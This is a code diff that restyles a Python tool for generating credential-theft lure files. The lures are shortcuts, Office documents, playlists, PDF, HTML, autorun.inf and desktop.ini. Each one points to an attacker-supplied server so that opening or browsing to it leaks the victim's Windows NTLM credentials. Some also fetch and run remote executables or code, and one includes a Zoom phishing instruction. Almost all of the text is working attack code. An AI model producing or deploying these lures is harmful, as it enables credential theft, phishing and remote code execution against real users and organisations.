@@ -78,247 +78,190 @@ args = parser.parse_args()
 # NOT WORKING ON LATEST WINDOWS
 # .scf remote IconFile Attack
 # Filename: shareattack.scf, action=browse, attacks=explorer
-def create_scf(generate,server,filename):
-	if generate == "modern":
-		print("Skipping SCF as it does not work on modern Windows")
-		return
-	file = open(filename,'w')
-	file.write('''[Shell]
+def create_scf(generate, server, filename):
+    if generate == "modern":
+        print("Skipping SCF as it does not work on modern Windows")
+        return
+    with open(filename, 'w') as file:
+        file.write(f'''[Shell]
 Command=2
-IconFile=\\\\''' + server + '''\\tools\\nc.ico
+IconFile=\\\\{server}\\tools\\nc.ico
 [Taskbar]
 Command=ToggleDesktop''')
-	file.close()
-	print("Created: " + filename + " (BROWSE TO FOLDER)")
-
-# .url remote url attack
-def create_url_url(generate,server,filename):
-	file = open(filename,'w')
-	file.write('''[InternetShortcut]
-URL=file://''' + server + '''/leak/leak.html''')
-	file.close()
-	print("Created: " + filename + " (BROWSE TO FOLDER)")
+    print(f"Created: {filename} (BROWSE TO FOLDER)")
 
 
-# .url remote IconFile attack
-# Filename: shareattack.url, action=browse, attacks=explorer
-def create_url_icon(generate,server,filename):
-	file = open(filename,'w')
-	file.write('''[InternetShortcut]
+def create_url_url(generate, server, filename):
+    with open(filename, 'w') as file:
+        file.write(f'''[InternetShortcut]
+URL=file://{server}/leak/leak.html''')
+    print(f"Created: {filename} (BROWSE TO FOLDER)")
+
+
+def create_url_icon(generate, server, filename):
+    with open(filename, 'w') as file:
+        file.write(f'''[InternetShortcut]
 URL=whatever
 WorkingDirectory=whatever
-IconFile=\\\\''' + server + '''\\%USERNAME%.icon
+IconFile=\\\\{server}\\%USERNAME%.icon
 IconIndex=1''')
-	file.close()
-	print("Created: " + filename + " (BROWSE TO FOLDER)")
+    print(f"Created: {filename} (BROWSE TO FOLDER)")
 
-# .rtf remote INCLUDEPICTURE attack
-# Filename: shareattack.rtf, action=open, attacks=notepad/wordpad
-def create_rtf(generate,server,filename):
-	file = open(filename,'w')
-	file.write('''{\\rtf1{\\field{\\*\\fldinst {INCLUDEPICTURE "file://''' + server + '''/test.jpg" \\\\* MERGEFORMAT\\\\d}}{\\fldrslt}}}''')
-	file.close()
-	print("Created: " + filename + " (OPEN)")
 
-# .xml remote stylesheet attack
-# Filename: shareattack.xml, action=open, attacks=word
-def create_xml(generate,server,filename):
-	file = open(filename,'w')
-	file.write('''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<?mso-application progid="Word.Document"?>
-<?xml-stylesheet type="text/xsl" href="\\\\''' + server + '''\\bad.xsl" ?>''')
-	file.close()
-	print("Created: " + filename + " (OPEN)")
-
-# .xml with remote includepicture field attack
-# Filename: shareattack.xml, action=open, attacks=word
-def create_xml_includepicture(generate, server, filename):
-    # Source path (read-only in Nix store)
-    documentfilename = os.path.join(script_directory, "templates", "includepicture-template.xml")
-    
-    # Read the template file
-    with open(documentfilename, 'r', encoding="utf8") as file:
-        filedata = file.read()
-    
-    # Replace the target string
-    filedata = filedata.replace('127.0.0.1', server)
-    
-    # Write the modified data to the specified output file
-    with open(filename, 'w', encoding="utf8") as file:
-        file.write(filedata)
-    
+def create_rtf(generate, server, filename):
+    with open(filename, 'w') as file:
+        file.write(f'''{{\\rtf1{{\\field{{\\*\\fldinst {{INCLUDEPICTURE "file://{server}/test.jpg" \\\\* MERGEFORMAT\\\\d}}}}{{\\fldrslt}}}}}}''')
     print(f"Created: {filename} (OPEN)")
 
-# .htm with remote image attack
-# Filename: shareattack.htm, action=open, attacks=internet explorer + Edge + Chrome when launched from desktop
-def create_htm(generate,server,filename):
-	file = open(filename,'w')
-	file.write('''<!DOCTYPE html>
-<html>
-   <img src="file://''' + server + '''/leak/leak.png"/>
-</html>''')
-	file.close()
-	print("Created: " + filename + " (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)")
 
-# .docx file with remote includepicture field attack
+def create_xml(generate, server, filename):
+    with open(filename, 'w') as file:
+        file.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<?mso-application progid="Word.Document"?>
+<?xml-stylesheet type="text/xsl" href="\\\\{server}\\bad.xsl" ?>''')
+    print(f"Created: {filename} (OPEN)")
+
+
+def create_xml_includepicture(generate, server, filename):
+    src = os.path.join(script_directory, "templates", "includepicture-template.xml")
+    with open(src, 'r', encoding="utf8") as file:
+        filedata = file.read()
+    filedata = filedata.replace('127.0.0.1', server)
+    with open(filename, 'w', encoding="utf8") as file:
+        file.write(filedata)
+    print(f"Created: {filename} (OPEN)")
+
+
+def create_htm(generate, server, filename):
+    with open(filename, 'w') as file:
+        file.write(f'''<!DOCTYPE html>
+<html>
+   <img src="file://{server}/leak/leak.png"/>
+</html>''')
+    print(f"Created: {filename} (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)")
+
+
 def create_docx_includepicture(generate, server, filename):
-    # Source path (read-only in Nix store)
-    src = os.path.join(script_directory, "docx-includepicture-template")
-    
-    # Temporary destination path
+    src = os.path.join(script_directory, "templates", "docx-includepicture-template")
     with tempfile.TemporaryDirectory() as temp_dir:
         dest = os.path.join(temp_dir, "docx-includepicture-template")
-        # Copy the template to the writable temporary directory
         shutil.copytree(src, dest)
-        
-        # Modify the document.xml.rels file in the temporary directory
         documentfilename = os.path.join(dest, "word", "_rels", "document.xml.rels")
         with open(documentfilename, 'r') as file:
             filedata = file.read()
         filedata = filedata.replace('127.0.0.1', server)
         with open(documentfilename, 'w') as file:
             file.write(filedata)
-        
-        # Create the .docx archive from the modified template
         shutil.make_archive(filename, 'zip', dest)
         os.rename(filename + ".zip", filename)
-        print(f"Created: {filename} (OPEN)")
+    print(f"Created: {filename} (OPEN)")
 
-# .docx file with remote template attack
-# Filename: shareattack.docx (unzip and put inside word\_rels\settings.xml.rels), action=open, attacks=word
-# Instructions: Word > Create New Document > Choose a Template > Unzip docx, change target in word\_rels\settings.xml.rels change target to smb server
+
 def create_docx_remote_template(generate, server, filename):
-    # Source path (read-only in Nix store)
     src = os.path.join(script_directory, "templates", "docx-remotetemplate-template")
-    
-    # Temporary destination path
     with tempfile.TemporaryDirectory() as temp_dir:
         dest = os.path.join(temp_dir, "docx-remotetemplate-template")
-        # Copy the template to the writable temporary directory
         shutil.copytree(src, dest)
-        
-        # Modify the settings.xml.rels file in the temporary directory
         documentfilename = os.path.join(dest, "word", "_rels", "settings.xml.rels")
         with open(documentfilename, 'r') as file:
             filedata = file.read()
         filedata = filedata.replace('127.0.0.1', server)
         with open(documentfilename, 'w') as file:
             file.write(filedata)
-        
-        # Create the .docx archive from the modified template
         shutil.make_archive(filename, 'zip', dest)
         os.rename(filename + ".zip", filename)
-        print(f"Created: {filename} (OPEN)")
+    print(f"Created: {filename} (OPEN)")
 
-# .docx file with Frameset attack
+
 def create_docx_frameset(generate, server, filename):
-    # Source path (read-only in Nix store)
     src = os.path.join(script_directory, "templates", "docx-frameset-template")
-    
-    # Temporary destination path
     with tempfile.TemporaryDirectory() as temp_dir:
         dest = os.path.join(temp_dir, "docx-frameset-template")
-        # Copy the template to the writable temporary directory
         shutil.copytree(src, dest)
-        
-        # Modify the webSettings.xml.rels file in the temporary directory
         documentfilename = os.path.join(dest, "word", "_rels", "webSettings.xml.rels")
         with open(documentfilename, 'r') as file:
             filedata = file.read()
         filedata = filedata.replace('127.0.0.1', server)
         with open(documentfilename, 'w') as file:
             file.write(filedata)
-        
-        # Create the .docx archive from the modified template
         shutil.make_archive(filename, 'zip', dest)
         os.rename(filename + ".zip", filename)
-        print(f"Created: {filename} (OPEN)")
+    print(f"Created: {filename} (OPEN)")
 
-# .xlsx file with cell based attack
-def create_xlsx_externalcell(generate,server,filename):
-	workbook = xlsxwriter.Workbook(filename)
-	worksheet = workbook.add_worksheet()
-	worksheet.write_url('AZ1', "external://"+server+"\\share\\[Workbookname.xlsx]SheetName'!$B$2:$C$62,2,FALSE)")
-	workbook.close()
-	print("Created: " + filename + " (OPEN)")
 
-# .wax remote playlist attack
-# Filename: shareattack.wax, action=open, attacks=windows media player
-def create_wax(generate,server,filename):
-	file = open(filename,'w')
-	file.write('''https://''' + server + '''/test
-file://\\\\''' + server + '''/steal/file''')
-	file.close()
-	print("Created: " + filename + " (OPEN)")
+def create_xlsx_externalcell(generate, server, filename):
+    workbook = xlsxwriter.Workbook(filename)
+    worksheet = workbook.add_worksheet()
+    worksheet.write_url('AZ1', f"external://{server}\\share\\[Workbookname.xlsx]SheetName'!$B$2:$C$62,2,FALSE)")
+    workbook.close()
+    print(f"Created: {filename} (OPEN)")
 
-# .m3u remote playlist attack
-# Filename: shareattack.m3u, action=open, attacks=windows media player
-def create_m3u(generate,server,filename):
-	file = open(filename,'w')
-	file.write('''#EXTM3U
+
+def create_wax(generate, server, filename):
+    with open(filename, 'w') as file:
+        file.write(f'''https://{server}/test
+file://\\\\{server}/steal/file''')
+    print(f"Created: {filename} (OPEN)")
+
+
+def create_m3u(generate, server, filename):
+    with open(filename, 'w') as file:
+        file.write(f'''#EXTM3U
 #EXTINF:1337, Leak
-\\\\''' + server + '''\\leak.mp3''')
-	file.close()
-	print("Created: " + filename + " (OPEN IN WINDOWS MEDIA PLAYER ONLY)")
+\\\\{server}\\leak.mp3''')
+    print(f"Created: {filename} (OPEN IN WINDOWS MEDIA PLAYER ONLY)")
 
-# .asx remote playlist attack
-# Filename: shareattack.asx, action=open, attacks=windows media player
-def create_asx(generate,server,filename):
-	file = open(filename,'w')
-	file.write('''<asx version="3.0">
+
+def create_asx(generate, server, filename):
+    with open(filename, 'w') as file:
+        file.write(f'''<asx version="3.0">
    <title>Leak</title>
    <entry>
       <title></title>
-      <ref href="file://''' + server + '''/leak/leak.wma"/>
+      <ref href="file://{server}/leak/leak.wma"/>
    </entry>
 </asx>''')
-	file.close()
-	print("Created: " + filename + " (OPEN)")
+    print(f"Created: {filename} (OPEN)")
 
-# .jnlp remote jar attack
-# Filename: shareattack.jnlp, action=open, attacks=java web start
-def create_jnlp(generate,server,filename):
-	file = open(filename,'w')
-	file.write('''<?xml version="1.0" encoding="UTF-8"?>
+
+def create_jnlp(generate, server, filename):
+    with open(filename, 'w') as file:
+        file.write(f'''<?xml version="1.0" encoding="UTF-8"?>
 <jnlp spec="1.0+" codebase="" href="">
    <resources>
-      <jar href="file://''' + server + '''/leak/leak.jar"/>
+      <jar href="file://{server}/leak/leak.jar"/>
    </resources>
    <application-desc/>
 </jnlp>''')
-	file.close()
-	print("Created: " + filename + " (OPEN)")
+    print(f"Created: {filename} (OPEN)")
 
-# .application remote dependency codebase attack
-# Filename: shareattack.application, action=open, attacks= .NET ClickOnce
-def create_application(generate,server,filename):
-	file = open(filename,'w')
-	file.write('''<?xml version="1.0" encoding="utf-8"?>
+
+def create_application(generate, server, filename):
+    with open(filename, 'w') as file:
+        file.write(f'''<?xml version="1.0" encoding="utf-8"?>
 <asmv1:assembly xsi:schemaLocation="urn:schemas-microsoft-com:asm.v1 assembly.adaptive.xsd" manifestVersion="1.0" xmlns:dsig="http://www.w3.org/2000/09/xmldsig#" xmlns="urn:schemas-microsoft-com:asm.v2" xmlns:asmv1="urn:schemas-microsoft-com:asm.v1" xmlns:asmv2="urn:schemas-microsoft-com:asm.v2" xmlns:xrml="urn:mpeg:mpeg21:2003:01-REL-R-NS" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
-   <assemblyIdentity name="Leak.app" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" xmlns="urn:schemas-microsoft-com:asm.v1" />
-   <description asmv2:publisher="Leak" asmv2:product="Leak" asmv2:supportUrl="" xmlns="urn:schemas-microsoft-com:asm.v1" />
-   <deployment install="false" mapFileExtensions="true" trustURLParameters="true" />
-   <dependency>
-      <dependentAssembly dependencyType="install" codebase="file://''' + server + '''/leak/Leak.exe.manifest" size="32909">
-         <assemblyIdentity name="Leak.exe" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" type="win32" />
-         <hash>
-            <dsig:Transforms>
-               <dsig:Transform Algorithm="urn:schemas-microsoft-com:HashTransforms.Identity" />
-            </dsig:Transforms>
-            <dsig:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1" />
-            <dsig:DigestValue>ESZ11736AFIJnp6lKpFYCgjw4dU=</dsig:DigestValue>
-         </hash>
-      </dependentAssembly>
-   </dependency>
+   <assemblyIdentity name="Leak.app" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" xmlns="urn:schemas-microsoft-com:asm.v1" />
+   <description asmv2:publisher="Leak" asmv2:product="Leak" asmv2:supportUrl="" xmlns="urn:schemas-microsoft-com:asm.v1" />
+   <deployment install="false" mapFileExtensions="true" trustURLParameters="true" />
+   <dependency>
+      <dependentAssembly dependencyType="install" codebase="file://{server}/leak/Leak.exe.manifest" size="32909">
+         <assemblyIdentity name="Leak.exe" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" type="win32" />
+         <hash>
+            <dsig:Transforms>
+               <dsig:Transform Algorithm="urn:schemas-microsoft-com:HashTransforms.Identity" />
+            </dsig:Transforms>
+            <dsig:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1" />
+            <dsig:DigestValue>ESZ11736AFIJnp6lKpFYCgjw4dU=</dsig:DigestValue>
+         </hash>
+      </dependentAssembly>
+   </dependency>
 </asmv1:assembly>''')
-	file.close()
-	print("Created: " + filename + " (DOWNLOAD AND OPEN)")
+    print(f"Created: {filename} (DOWNLOAD AND OPEN)")
 
-# .pdf remote object? attack
-# Filename: shareattack.pdf, action=open, attacks=Adobe Reader (Others?)
-def create_pdf(generate,server,filename):
-	file = open(filename,'w')
-	file.write('''%PDF-1.7
+
+def create_pdf(generate, server, filename):
+    with open(filename, 'w') as file:
+        file.write(f'''%PDF-1.7
 1 0 obj
 <</Type/Catalog/Pages 2 0 R>>
 endobj
@@ -342,22 +285,22 @@ startxref
 << /Type /Page
    /Contents 4 0 R
    /AA <<
-	   /O <<
-	      /F (\\\\\\\\''' + server + '''\\\\test)
-		  /D [ 0 /Fit]
-		  /S /GoToE
-		  >>
-	   >>
-	   /Parent 2 0 R
-	   /Resources <<
-			/Font <<
-				/F1 <<
-					/Type /Font
-					/Subtype /Type1
-					/BaseFont /Helvetica
-					>>
-				  >>
-				>>
+       /O <<
+          /F (\\\\\\\\{server}\\\\test)
+          /D [ 0 /Fit]
+          /S /GoToE
+          >>
+       >>
+       /Parent 2 0 R
+       /Resources <<
+            /Font <<
+                /F1 <<
+                    /Type /Font
+                    /Subtype /Type1
+                    /BaseFont /Helvetica
+                    >>
+                  >>
+                >>
 >>
 endobj
 4 0 obj<< /Length 100>>
@@ -372,51 +315,47 @@ endstream
 endobj
 trailer
 <<
-	/Root 1 0 R
+    /Root 1 0 R
 >>
 %%EOF''')
-	file.close()
-	print("Created: " + filename + " (OPEN AND ALLOW)")
+    print(f"Created: {filename} (OPEN AND ALLOW)")
 
 
-def create_zoom(generate,server,filename):
-	if generate == "modern":
-		print("Skipping zoom as it does not work on the latest versions")
-		return
-	file = open(filename,'w')
-	file.write('''To attack zoom, just put the following link along with your phishing message in the chat window:
+def create_zoom(generate, server, filename):
+    if generate == "modern":
+        print("Skipping zoom as it does not work on the latest versions")
+        return
+    with open(filename, 'w') as file:
+        file.write(f'''To attack zoom, just put the following link along with your phishing message in the chat window:
 
-\\\\''' + server + '''\\xyz
+\\\\{server}\\xyz
 ''')
-	file.close()
-	print("Created: " + filename + " (PASTE TO CHAT)")
+    print(f"Created: {filename} (PASTE TO CHAT)")
 
-def create_autoruninf(generate,server,filename):
-	if generate == "modern":
-		print("Skipping Autorun.inf as it does not work on modern Windows")
-		return
-	file = open(filename,'w')
-	file.write('''[autorun]
-open=\\\\''' + server + '''\\setup.exe
+
+def create_autoruninf(generate, server, filename):
+    if generate == "modern":
+        print("Skipping Autorun.inf as it does not work on modern Windows")
+        return
+    with open(filename, 'w') as file:
+        file.write(f'''[autorun]
+open=\\\\{server}\\setup.exe
 icon=something.ico
 action=open Setup.exe''')
-	file.close()
-	print("Created: " + filename + " (BROWSE TO FOLDER)")
+    print(f"Created: {filename} (BROWSE TO FOLDER)")
 
-def create_desktopini(generate,server,filename):
-	if generate == "modern":
-		print("Skipping desktop.ini as it does not work on modern Windows")
-		return
-	file = open(filename,'w')
-	file.write('''[.ShellClassInfo]
-IconResource=\\\\''' + server + '''\\aa''')
-	file.close()
-	print("Created: " + filename + " (BROWSE TO FOLDER)")
 
-# .lnk remote IconFile Attack
-# Filename: shareattack.lnk, action=browse, attacks=explorer
+def create_desktopini(generate, server, filename):
+    if generate == "modern":
+        print("Skipping desktop.ini as it does not work on modern Windows")
+        return
+    with open(filename, 'w') as file:
+        file.write(f'''[.ShellClassInfo]
+IconResource=\\\\{server}\\aa''')
+    print(f"Created: {filename} (BROWSE TO FOLDER)")
+
+
 def create_lnk(generate, server, filename):
-    # these two numbers define location in template that holds icon location
     offset = 0x136
     max_path = 0xDF
     unc_path = f'\\\\{server}\\tools\\nc.ico'
@@ -424,26 +363,17 @@ def create_lnk(generate, server, filename):
         print("Server name too long for lnk template, skipping.")
         return
     unc_path = unc_path.encode('utf-16le')
-
-    # Source path (read-only in Nix store)
     src = os.path.join(script_directory, "templates", "shortcut-template.lnk")
-    
-    # Temporary destination path
     with tempfile.TemporaryDirectory() as temp_dir:
         temp_file = os.path.join(temp_dir, "shortcut-template.lnk")
-        shutil.copy2(src, temp_file)  # Copy template to temporary location
-        
-        # Modify the template
+        shutil.copy2(src, temp_file)
         with open(temp_file, 'rb') as lnk:
             shortcut = list(lnk.read())
         for i in range(0, len(unc_path)):
             shortcut[offset + i] = unc_path[i]
-        
-        # Write the modified shortcut to the specified filename
         with open(filename, 'wb') as file:
             file.write(bytes(shortcut))
-        
-        print(f"Created: {filename} (BROWSE TO FOLDER)")
+    print(f"Created: {filename} (BROWSE TO FOLDER)")
 
 
 # create folder to hold templates, if already exists delete it
